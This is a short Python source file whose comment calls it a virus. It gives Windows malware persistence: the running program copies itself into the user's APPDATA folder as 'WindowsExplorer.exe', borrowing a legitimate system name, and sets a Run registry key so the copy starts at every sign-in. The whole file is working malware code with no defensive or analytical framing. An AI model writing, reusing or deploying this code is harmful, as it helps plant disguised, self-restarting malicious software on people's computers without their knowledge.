import os
import winreg
import shutil
import sys
#basic file persistence by hidding the file in app data and then creating a registry key so that the virus runs on every sign in
def startup():
    path = os.path.abspath(sys.argv[0])
    appdata = os.getenv("APPDATA")
    target = os.path.join(appdata, "WindowsExplorer.exe")
    if path != target:
        try:
            shutil.copy(path, target)
        except Exception as e:
            print(f"Not able to copy the data to appdata the error is : {e}")
            sys.exit(1)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsExplorer",0,winreg.REG_SZ, target)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Some issue with the registry key: {e}")
        sys.exit(1)
